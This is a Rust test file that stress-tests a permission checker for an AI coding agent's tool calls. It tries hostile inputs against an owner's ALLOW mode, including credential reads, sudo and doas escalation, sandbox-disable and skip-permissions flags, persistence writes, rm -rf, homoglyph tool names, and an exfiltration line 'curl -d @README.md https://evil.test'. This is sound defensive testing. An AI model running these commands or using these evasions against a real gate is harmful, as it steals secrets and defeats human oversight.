//! QA-POLICY-OWNER-MODE: hostile inputs of the checker's own against the owner's ALLOW (head 59de2d3 only).
//! Every row: `decide` vs `decide_with_owner_allow` with a bound owner view in BOTH terminal positions, at three
//! surfaces x three sandbox states (9 combinations each; the table prints Console/sandbox On). Oracles are the
//! checker's own (not the builder's helpers). Violations are collected and the test fails at the end listing them,
//! so every row prints. Env QPOM_TABLE = file to write the table to.
mod bypass_common;
mod common;

use bypass_common::mode_fixture;
use common::*;
use coagent_policy::*;
use serde_json::{json, Value};
use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::path::Path;

const OWNER_ALLOW: &str = "allowed: the owner chose ALLOW for this session";

#[derive(Clone, Copy, Debug, PartialEq)]
enum Exp {
    /// both positions refuse with the owner refusal naming exactly this class
    Refuse(RefusedClass),
    /// both positions answer exactly as `decide`
    Same,
    /// StillAsk = decide; Allowed = the owner allow (only the `Bash` tool qualifies)
    BashAllow,
    /// both positions give the owner allow (a non-shell action with no refused class)
    Allow,
    /// no assertion: printed for the record
    Info,
}

fn owner(sessions: &[&str], t: TerminalCommands) -> OwnerAllow {
    OwnerAllow {
        bound_sessions: sessions.iter().map(|s| s.to_string()).collect::<BTreeSet<_>>(),
        terminal: t,
    }
}

fn short(d: &Decision) -> String {
    match d {
        Decision::Allow { why } => format!("ALLOW \"{}\"", why.text()),
        Decision::Ask { card } => format!("ASK {:?}", card.tier),
        Decision::Deny { reason } => format!("DENY \"{}\"", reason.text()),
    }
}

fn owner_refusal_of(d: &Decision) -> Option<&'static str> {
    match d {
        Decision::Deny {
            reason: DenyReason::RefusedInAllow { reason },
        } => Some(reason),
        _ => None,
    }
}

fn is_owner_allow(d: &Decision) -> bool {
    matches!(d, Decision::Allow { why: AllowWhy::OwnerChoseAllow }) && matches!(d, Decision::Allow { why } if why.text() == OWNER_ALLOW)
}

struct Ctx {
    table: String,
    violations: Vec<String>,
    rows: usize,
}

impl Ctx {
    fn row(&mut self, label: &str, a: &Action, st: &State, view_sessions: &[&str], exp: Exp) {
        self.rows += 1;
        let sa = owner(view_sessions, TerminalCommands::StillAsk);
        let al = owner(view_sessions, TerminalCommands::Allowed);
        let mut printed = false;
        for sb in [Sandbox::On, Sandbox::Off, Sandbox::Unknown] {
            for surface in [Surface::Console, Surface::TerminalPrompt, Surface::None] {
                let mut st = st.clone();
                st.sandbox = sb;
                let d = decide(a, &st, surface, NOW);
                let ds = decide_with_owner_allow(a, &st, Some(&sa), surface, NOW);
                let dl = decide_with_owner_allow(a, &st, Some(&al), surface, NOW);
                let none = decide_with_owner_allow(a, &st, None, surface, NOW);
                let tag = format!("{label} [{sb:?}/{surface:?}]");
                if none != d {
                    self.violations.push(format!("{tag}: owner None differs from decide"));
                }
                // both-agree view with the shell verified: the shared list must refuse the same class
                let ba = bypass_common::view(NOW.plus_secs(3600), view_sessions, true);
                let db = decide_with_mode(a, &st, Some(&ba), surface, NOW);
                let ba_class = match &db {
                    Decision::Deny { reason: DenyReason::BypassRefused { reason } } => Some(*reason),
                    _ => None,
                };
                if owner_refusal_of(&dl) != ba_class || owner_refusal_of(&ds) != ba_class {
                    self.violations.push(format!(
                        "{tag}: owner refusal {:?}/{:?} differs from both-agree {:?}",
                        owner_refusal_of(&ds),
                        owner_refusal_of(&dl),
                        ba_class
                    ));
                }
                let ok = match exp {
                    Exp::Refuse(c) => {
                        owner_refusal_of(&ds) == Some(c.text()) && owner_refusal_of(&dl) == Some(c.text())
                    }
                    Exp::Same => ds == d && dl == d,
                    Exp::BashAllow => ds == d && is_owner_allow(&dl),
                    Exp::Allow => is_owner_allow(&ds) && is_owner_allow(&dl),
                    Exp::Info => true,
                };
                if !ok {
                    self.violations.push(format!(
                        "{tag}: expected {exp:?}; decide {} | StillAsk {} | Allowed {}",
                        short(&d),
                        short(&ds),
                        short(&dl)
                    ));
                }
                if !printed {
                    printed = true;
                    let _ = writeln!(
                        self.table,
                        "| {label} | {} | {} | {} | {exp:?} {} |",
                        short(&ds),
                        short(&dl),
                        short(&d),
                        if ok { "ok" } else { "VIOLATION" }
                    );
                }
            }
        }
    }
}

fn act_in(fx: &Fx, cwd: &str, tool: &str, input: Value) -> Action {
    let h = HookInput::parse(
        &json!({"session_id": SESSION, "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": tool,
                "tool_input": input, "permission_mode": "default"})
        .to_string(),
    )
    .unwrap();
    classify(&h, HostOs::Posix, &fx.env(), &PosixNormaliser)
}

fn s(p: &Path) -> String {
    p.to_str().unwrap().to_string()
}

#[test]
fn qpom_owner_attack() {
    let fx = mode_fixture("qpom-attack");
    for (p, c) in [
        (fx.home.join(".aws/credentials"), "k"),
        (fx.home.join(".gnupg/x"), "k"),
        (fx.home.join(".claude.json"), "{}"),
        (fx.home.join(".config/git/config"), "[x]"),
        (fx.home.join(".coagent/identity.key"), "k"),
        (fx.home.join("Library/LaunchAgents/a.plist"), "x"),
        (fx.ws.join("src/.env"), "T=1"),
        (fx.ws.join("notes.md"), "n"),
    ] {
        bypass_common::touch(&p, c);
    }
    let ws = s(&fx.ws);
    let home = s(&fx.home);
    let st = fx.state();
    let st_env = fx.state_with(vec!["**/.env*".into()]);
    let st_secret = fx.state_with(vec!["<ws>/secret/**".into()]);
    let me = [SESSION];
    let mut c = Ctx {
        table: String::from("| input | owner StillAsk | owner Allowed | decide (today) | expectation / judgement |\n|---|---|---|---|---|\n"),
        violations: vec![],
        rows: 0,
    };
    use RefusedClass as K;
    let bash = |cmd: &str| fx.act("Bash", json!({"command": cmd}));
    let tool = |t: &str, cmd: &str| fx.act(t, json!({"command": cmd}));

    // ---- each of the 16 classes, two actions of the checker's own choosing ----
    c.row("Grep path ~/.gnupg", &fx.act("Grep", json!({"pattern": "x", "path": "~/.gnupg"})), &st, &me, Exp::Refuse(K::Credential));
    c.row("Bash base64 ~/.aws/credentials", &bash("base64 ~/.aws/credentials"), &st, &me, Exp::Refuse(K::Credential));
    c.row("PowerShell Get-Content ~/.aws/credentials", &tool("PowerShell", "Get-Content ~/.aws/credentials"), &st, &me, Exp::Refuse(K::Credential));
    // CriticalSpelling: only the Windows normaliser (compiled only on Windows) makes one: built by hand
    {
        let mut a = fx.write(&fx.ws.join("notes.md"), "x");
        a.targets = vec![Target::Path { role: PathRole::Write, path: NormPath::Critical { raw: r"\\?\C:\ws\a".into(), why: "device prefix" } }];
        c.row("Write \\\\?\\C:\\ws\\a (hand-built Critical)", &a, &st, &me, Exp::Refuse(K::CriticalSpelling));
        let mut a = bash("type a.txt");
        a.targets.push(Target::Path { role: PathRole::Mentioned, path: NormPath::Critical { raw: r"C:\ws\a.txt:x".into(), why: "alternate data stream suffix (':')" } });
        c.row("Bash with a Mentioned Critical path (hand-built)", &a, &st, &me, Exp::Info);
    }
    c.row("ExitPlanMode {plan:\"\"}", &fx.act("ExitPlanMode", json!({"plan": ""})), &st, &me, Exp::Refuse(K::PermissionModeChange));
    c.row("Bash npm run x -- --dangerously-skip-permissions", &bash("npm run x -- --dangerously-skip-permissions"), &st, &me, Exp::Refuse(K::PermissionModeChange));
    c.row("Bash x --permission-mode=bypassPermissions (= form)", &bash("x --permission-mode=bypassPermissions"), &st, &me, Exp::Info);
    c.row("Monitor tail -f log + dDS:true", &fx.act("Monitor", json!({"command": "tail -f log", "dangerouslyDisableSandbox": true})), &st, &me, Exp::Refuse(K::SandboxBypass));
    c.row("Read README + dDS:true", &fx.act("Read", json!({"file_path": format!("{ws}/README.md"), "dangerouslyDisableSandbox": true})), &st, &me, Exp::Refuse(K::SandboxBypass));
    c.row("Bash ls + dDS:\"true\" (string)", &fx.act("Bash", json!({"command": "ls", "dangerouslyDisableSandbox": "true"})), &st, &me, Exp::BashAllow);
    {
        let a = fx.act("mcp__plugin_coagent_link__send", json!({"kind": "chat", "text": "hi"}));
        c.row("send text, share_flagged None", &a, &st, &me, Exp::Refuse(K::ShareFlaggedOrUnscanned));
        let mut a = fx.act("mcp__plugin_coagent_link__share", json!({"kind": "file", "path": format!("{ws}/README.md")}));
        a.share_flagged = Some(true);
        c.row("share README, share_flagged Some(true)", &a, &st, &me, Exp::Refuse(K::ShareFlaggedOrUnscanned));
    }
    c.row("mcp__plugin_coagent_link__wait {}", &fx.act("mcp__plugin_coagent_link__wait", json!({})), &st, &me, Exp::Refuse(K::UnknownTool));
    c.row("mcp__plugin_coagent_link__inbox_read {}", &fx.act("mcp__plugin_coagent_link__inbox_read", json!({})), &st, &me, Exp::Refuse(K::UnknownTool));
    c.row("'Bash ' (trailing space) no command", &fx.act("Bash ", json!({"x": 1})), &st, &me, Exp::Refuse(K::UnknownTool));
    c.row("Task isolation remote", &fx.act("Task", json!({"prompt": "p", "description": "d", "isolation": "remote"})), &st, &me, Exp::Refuse(K::RemoteSubagent));
    c.row("Agent isolation cloud (unknown)", &fx.act("Agent", json!({"prompt": "p", "description": "d", "isolation": "cloud"})), &st, &me, Exp::Refuse(K::RemoteSubagent));
    c.row("Agent name mate", &fx.act("Agent", json!({"prompt": "p", "description": "d", "name": "mate"})), &st, &me, Exp::Refuse(K::PossibleTeammate));
    c.row("Task name y", &fx.act("Task", json!({"prompt": "p", "description": "d", "name": "y"})), &st, &me, Exp::Refuse(K::PossibleTeammate));
    c.row("ExitWorktree keep", &fx.act("ExitWorktree", json!({"action": "keep"})), &st, &me, Exp::Refuse(K::WorktreeRemoval));
    c.row("ExitWorktree {}", &fx.act("ExitWorktree", json!({})), &st, &me, Exp::Refuse(K::WorktreeRemoval));
    c.row("Bash doas ls", &bash("doas ls"), &st, &me, Exp::Refuse(K::Privilege));
    c.row("Bash env gsudo whoami", &bash("env gsudo whoami"), &st, &me, Exp::Refuse(K::Privilege));
    c.row("Bash bash -c 'pkexec id'", &bash("bash -c 'pkexec id'"), &st, &me, Exp::Refuse(K::Privilege));
    c.row("Glob **/* in ws (excl **/.env*)", &fx.act("Glob", json!({"pattern": "**/*", "path": ws})), &st_env, &me, Exp::Refuse(K::MayReadExcluded));
    c.row("Grep src (excl **/.env*)", &fx.act("Grep", json!({"pattern": "x", "path": format!("{ws}/src")})), &st_env, &me, Exp::Refuse(K::MayReadExcluded));
    c.row("NotebookRead ~/.claude.json", &fx.act("NotebookRead", json!({"notebook_path": format!("{home}/.claude.json")})), &st, &me, Exp::Refuse(K::GateFileRead));
    c.row("LS gate-config", &fx.act("LS", json!({"path": s(&fx.root.join("gate-config"))})), &st, &me, Exp::Refuse(K::GateFileRead));
    c.row("Edit ~/.config/git/config", &fx.act("Edit", json!({"file_path": "~/.config/git/config", "old_string": "a", "new_string": "b"})), &st, &me, Exp::Refuse(K::LaterRunningWrite));
    c.row("Bash cp x ~/Library/LaunchAgents/a.plist", &bash("cp x ~/Library/LaunchAgents/a.plist"), &st, &me, Exp::Refuse(K::LaterRunningWrite));
    c.row("Bash exec coagent-mcp", &bash("exec coagent-mcp"), &st, &me, Exp::Refuse(K::AgentProgramWord));
    c.row("Monitor claude --resume", &tool("Monitor", "claude --resume"), &st, &me, Exp::Refuse(K::AgentProgramWord));
    c.row("Write ~nobody/x", &fx.act("Write", json!({"file_path": "~nobody/x", "content": "x"})), &st, &me, Exp::Refuse(K::UnresolvedTarget));
    c.row("Bash npm test from cwd \"\"", &act_in(&fx, "", "Bash", json!({"command": "npm test"})), &st, &me, Exp::Refuse(K::UnresolvedTarget));
    c.row("WebFetch gopher://x", &fx.act("WebFetch", json!({"url": "gopher://x/", "prompt": "p"})), &st, &me, Exp::Refuse(K::NonWebFetch));
    c.row("WebFetch example.com/x (no scheme)", &fx.act("WebFetch", json!({"url": "example.com/x", "prompt": "p"})), &st, &me, Exp::Refuse(K::NonWebFetch));

    // ---- precedence: two classes on one action, the first in ALL's order is named ----
    c.row("Bash sudo cat ~/.ssh/id_rsa (Cred+Priv)", &bash("sudo cat ~/.ssh/id_rsa"), &st, &me, Exp::Refuse(K::Credential));
    c.row("Bash claude -p hi + dDS:true (Sandbox+Word)", &fx.act("Bash", json!({"command": "claude -p hi", "dangerouslyDisableSandbox": true})), &st, &me, Exp::Refuse(K::SandboxBypass));
    c.row("Bash sudo claude (Priv+Word)", &bash("sudo claude"), &st, &me, Exp::Refuse(K::Privilege));
    c.row("Read ~/.coagent/identity.key (Cred+GateRead)", &fx.act("Read", json!({"file_path": "~/.coagent/identity.key"})), &st, &me, Exp::Refuse(K::Credential));
    c.row("ExitPlanMode + dDS:true (Mode+Sandbox)", &fx.act("ExitPlanMode", json!({"plan": "x", "dangerouslyDisableSandbox": true})), &st, &me, Exp::Refuse(K::PermissionModeChange));
    c.row("mcp__x__y + dDS:true (Sandbox+Untaught)", &fx.act("mcp__x__y", json!({"q": 1, "dangerouslyDisableSandbox": true})), &st, &me, Exp::Refuse(K::SandboxBypass));

    // ---- steps [1]..[7b] with an owner view, both positions ----
    {
        let a = HookInput::parse(&json!({"session_id": "sess-other", "cwd": ws, "hook_event_name": "PreToolUse",
            "tool_name": "Bash", "tool_input": {"command": "npm test"}, "permission_mode": "default"}).to_string()).unwrap();
        let a = classify(&a, HostOs::Posix, &fx.env(), &PosixNormaliser);
        c.row("[1] wrong session (view binds both ids)", &a, &st, &["sess-other", SESSION], Exp::Same);
        let mut s2 = st.clone();
        s2.stopped = true;
        c.row("[2] stopped: Bash npm test", &bash("npm test"), &s2, &me, Exp::Same);
        let mut s3 = st.clone();
        s3.paused = true;
        c.row("[3] paused: Read README", &fx.read(&fx.ws.join("README.md")), &s3, &me, Exp::Same);
        let big = format!("echo {}", "a ".repeat(60_000));
        c.row("[4] oversize Bash command", &bash(&big), &st, &me, Exp::Same);
        c.row("[5] Read excluded secret/plan.txt", &fx.read(&fx.ws.join("secret/plan.txt")), &st_secret, &me, Exp::Same);
        c.row("[5?] Bash cat secret/plan.txt (excluded)", &bash("cat secret/plan.txt"), &st_secret, &me, Exp::Info);
        c.row("[6] Write ~/.claude/settings.json", &fx.act("Write", json!({"file_path": "~/.claude/settings.json", "content": "{}"})), &st, &me, Exp::Same);
        c.row("[6] Bash echo x >> ~/.zshrc", &bash("echo x >> ~/.zshrc"), &st, &me, Exp::Same);
        c.row("[6] Bash cat ~/.coagent/session.json", &bash("cat ~/.coagent/session.json"), &st, &me, Exp::Same);
        let mut s7 = st.clone();
        s7.link = LinkPhase::ClosedTainted;
        c.row("[7] closed tainted: Write notes.md", &fx.write(&fx.ws.join("notes.md"), "x"), &s7, &me, Exp::Same);
        c.row("[7] closed tainted: Bash npm test", &bash("npm test"), &s7, &me, Exp::Same);
        let mut s7b = st.clone();
        s7b.add_owner_command("npm test", &fx.ws, ShellKind::Bash, &PosixNormaliser).unwrap();
        c.row("[7b] owner list: Bash npm test", &bash("npm test"), &s7b, &me, Exp::Same);
        s7b.add_owner_command("sudo ls", &fx.ws, ShellKind::Bash, &PosixNormaliser).unwrap();
        c.row("[7b] owner list: Bash sudo ls", &bash("sudo ls"), &s7b, &me, Exp::Same);
    }

    // ---- sessions: unbound, empty, near misses ----
    for (lbl, sess) in [
        ("view {} (empty)", vec![]),
        ("view {other}", vec!["other"]),
        ("view {\"\"}", vec![""]),
        ("view {SESS-1} (case)", vec!["SESS-1"]),
        ("view {sess-1 } (trailing space)", vec!["sess-1 "]),
        ("view {sess-} (prefix)", vec!["sess-"]),
        ("view {sess-12} (longer)", vec!["sess-12"]),
        ("view { sess-1} (leading space)", vec![" sess-1"]),
    ] {
        c.row(&format!("unbound {lbl}: Read README"), &fx.read(&fx.ws.join("README.md")), &st, &sess, Exp::Same);
        c.row(&format!("unbound {lbl}: Bash npm test"), &bash("npm test"), &st, &sess, Exp::Same);
    }
    c.row("bound: Read README", &fx.read(&fx.ws.join("README.md")), &st, &me, Exp::Allow);
    c.row("bound: Write notes.md", &fx.write(&fx.ws.join("notes.md"), "x"), &st, &me, Exp::Allow);

    // ---- every Strict kind, both positions ----
    c.row("Strict NotTaught MadeUpTool {}", &fx.act("MadeUpTool", json!({})), &st, &me, Exp::Refuse(K::UnknownTool));
    c.row("Strict Shell Bash npm test", &bash("npm test"), &st, &me, Exp::BashAllow);
    c.row("Strict Shell PowerShell npm test", &tool("PowerShell", "npm test"), &st, &me, Exp::Same);
    c.row("Strict Shell Monitor npm test", &tool("Monitor", "npm test"), &st, &me, Exp::Same);
    c.row("Monitor ws url only", &fx.act("Monitor", json!({"ws": {"url": "wss://example.com/x"}})), &st, &me, Exp::Same);

    // ---- Bash spellings with the setting on ----
    for t in ["bash", "Bash ", " Bash", "BASH", "B\u{0430}sh", "Bash\u{200b}", "Bash\n", "Bash\0", "bash.exe", "/bin/bash"] {
        c.row(&format!("tool {t:?} command npm test"), &fx.act(t, json!({"command": "npm test"})), &st, &me, Exp::Same);
    }
    // ---- a command field on taught, untaught, mcp__ and this product's own tools ----
    for t in [
        "TodoWrite", "WebSearch", "Read", "Edit", "Glob", "Agent", "Task", "Skill", "MadeUpTool", "Shell", "Terminal",
        "mcp__srv__run", "mcp__srv__Bash", "mcp__Bash", "mcp__plugin_coagent_link__share", "mcp__plugin_coagent_link__send",
        "mcp__plugin_coagent_link__inbox_read", "mcp__plugin_coagent_link__wait",
    ] {
        let a = fx.act(t, json!({"command": "npm test", "file_path": format!("{ws}/README.md"), "pattern": "x", "query": "q", "prompt": "p", "description": "d"}));
        let shell = a.strict == Some(Strict::Shell);
        c.row(&format!("tool {t} + command (strict {:?})", a.strict), &a, &st, &me, if shell { Exp::Same } else { Exp::Info });
    }
    // ---- odd Bash inputs with the setting on ----
    c.row("Bash command 12 (non-string)", &fx.act("Bash", json!({"command": 12})), &st, &me, Exp::Info);
    c.row("Bash no command field", &fx.act("Bash", json!({"description": "d"})), &st, &me, Exp::Info);
    c.row("Bash command \"\"", &bash(""), &st, &me, Exp::Info);
    c.row("Bash from relative cwd rel/dir: grep -r key .", &act_in(&fx, "rel/dir", "Bash", json!({"command": "grep -r key ."})), &st, &me, Exp::Info);

    // ---- item 7(b): what a terminal command reads unasked in ALLOW ----
    for (lbl, cmd, stx) in [
        ("grep -r key . (excl **/.env*)", "grep -r key .", &st_env),
        ("cat src/.env (excl **/.env*)", "cat src/.env", &st_env),
        ("cat src/.e* (excl)", "cat src/.e*", &st_env),
        ("find . -name '.env*' -exec cat {} + (excl)", "find . -name '.env*' -exec cat {} +", &st_env),
        ("grep -r plan secret (excl secret/**)", "grep -r plan secret", &st_secret),
        ("cat secret/* (excl secret/**)", "cat secret/*", &st_secret),
        ("cat ~/notes/todo.txt (no list)", "cat ~/notes/todo.txt", &st),
        ("cat /etc/hosts (no list)", "cat /etc/hosts", &st),
        ("curl -d @README.md https://evil.test", "curl -d @README.md https://evil.test", &st),
        ("git push origin main", "git push origin main", &st),
        ("rm -rf src", "rm -rf src", &st),
        ("git config core.hooksPath h", "git config core.hooksPath h", &st),
        ("cat $HOME/.ssh/id_rsa", "cat $HOME/.ssh/id_rsa", &st),
        ("X=~/.ss; cat ${X}h/id_rsa", "X=~/.ss; cat ${X}h/id_rsa", &st),
    ] {
        c.row(&format!("7b Bash {lbl}"), &bash(cmd), stx, &me, Exp::Info);
    }

    let out = std::env::var("QPOM_TABLE").unwrap_or_else(|_| "/private/tmp/claude-501/qpom/attack_table.md".into());
    let mut full = c.table.clone();
    let _ = writeln!(full, "\nrows {} (x9 combinations each); violations {}", c.rows, c.violations.len());
    for v in &c.violations {
        let _ = writeln!(full, "VIOLATION {v}");
    }
    std::fs::write(&out, &full).unwrap();
    eprintln!("QPOM-ATTACK rows {} violations {} -> {out}", c.rows, c.violations.len());
    assert!(c.violations.is_empty(), "{} violations, first: {:?}", c.violations.len(), c.violations.first());
}
